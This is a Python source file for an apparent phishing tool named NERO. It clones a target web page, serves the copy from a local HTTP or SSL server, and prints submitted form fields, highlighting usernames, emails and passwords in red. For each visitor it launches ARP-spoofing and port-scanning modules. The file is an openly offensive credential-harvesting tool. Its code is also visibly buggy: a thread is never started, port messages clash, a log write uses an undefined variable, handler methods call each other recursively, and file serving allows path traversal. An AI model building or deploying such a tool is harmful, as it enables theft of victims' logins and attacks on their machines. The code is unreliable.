from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler
from urllib.request import urlopen
from socket import timeout
import ssl
import threading
import time
import sys
import os
import cgi
import re

dns = ""
local = 0
port = 0
page = ''
users = []
references = "user","email","number","pass","passwd","password"


def download_url(url):
    global page

    print("[!] Downloading...")
    
    try:
        html = urlopen(url).read().decode('utf-8')
        
        print("[!] Parsing the content...")

        parser = re.sub('href=\"[a-zA-Z0-9\:\/\?\&\.\<\=\;\"]{1,}','href="'+url+'"',html)

        if os.path.exists("./html/index.html"):
            os.remove("./html/index.html")
            print("[!] Deleted!")

        n = open("./html/index.html","w")
        n.write(parser)
        n.close

        page = parser

    except:
        print("[!] Cannot download url, please check your internet/url")

        print("\n")
        sys.exit(0)

"""Special features, here we set the main function to handle the other tools using threads"""

def extender(_client_ip):
    if status[0] == True:
        from core import _arp_spoof as ap
        t = threading.Thread(target=ap._user,args=(_client_ip,local,port,dns,))
    if status[1] == True:
        from core import _port_scanning as sc
        t = threading.Thread(target=sc.call, args=(_client_ip,))
        t.start()

def run(LHOST, LPORT,_status, url,_dns):
    LHOST = str(LHOST)
    LPORT = int(LPORT)
    if LPORT == 0:
        print("[!] No port configured, using 8080")
        LPORT = 80

    global status
    global costum

    dns = _dns
    port = LPORT
    local = LHOST

    costum = _status[4]

    if costum == False:
        download_url(url)

    status = _status

    try:
        #check if we are using ssl
        if _status[3] == True:
            httpd = HTTPServer((LHOST,443),handler)
            httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./cert/cert.pem", keyfile="./cert/cert.perm", server_side=True)

        else:
            httpd = HTTPServer((LHOST,LPORT),handler)
    except:
        print("\033[1;31m[!] Cannot bind server!\033[m")
        if(LPORT == 80):
            print("\033[1;33m[!] We detected your setting with LPORT at 80, to use it, start NERO as root\033[m")
        else:
            print("\033[1;31m[!] Try another port\033[m")
        return

    print('\033[1;37m[+] Starting NERO at',time.asctime(),'\033[m')
    print("\033[1;37m[+] Current page directory: nero/html\033[m")

    try:
        httpd.serve_forever()

    except KeyboardInterrupt:
        print("\033[1;31m[!] Stopped by user\033[m")

    except:
        log_file = open("log.txt","+r")
        log_file.write(file)
        log_file.close()
        print("\033[1;31m[!] Cannot start server!\033[m")

class handler(BaseHTTPRequestHandler):    

    def _set_headers(self):
        self.send_response_only(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

    def do_HEAD(self):
        return

    def do_GET(self):
        print("\033[1;34m[+] Connection from: {}\033[m".format(self.client_address[0]))

        if not self.client_address[0] in users:
            extender(self.client_address[0])
            users.append(self.client_address[0])
        
        else:
            users.append(self.client_address[0])

        self.respond()

    def do_POST(self):
        print("\033[1;33;41[+] NERO got something...!\033[m")

        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        form = str(form)

        form = re.sub("FieldStorage|None|MiniFieldStorage|[\(\)\[\]\,\']",'',form)
        form = form.split(" ")
        
        x = 0
        try:
            while x < len(form):
                if form[x] != "":
                    if form[x] in references:
                        print("\033[1;31m[*] {} => {}\033[m".format(form[x],form[x+1]))
                    else:
                        print("\033[1;32m[*] {} => {}\033[m".format(form[x],form[x+1]))
                x = x+2
        except:
            pass

    def handle_http(self,status,content_type):
        self._set_headers()

        if costum == False:
            return bytes(page,"UTF-8")

        elif costum == True:
            self.respond()

            if self.path == "/":
                try:
                    file = open("./html/index.html").read()
                    return bytes(file,"UTF-8")

                except:
                    return bytes("<p align='center'>Error 404 | Index not found</p>","UTF-8")

            else:
                try:
                    file = open("./html"+self.path).read()
                    return bytes(file,"UTF-8")

                except:
                    return bytes("<p align='center'>Error 404</p>","UTF-8")

    def respond(self):
        content = self.handle_http(200,'text/html')
        self.wfile.write(content)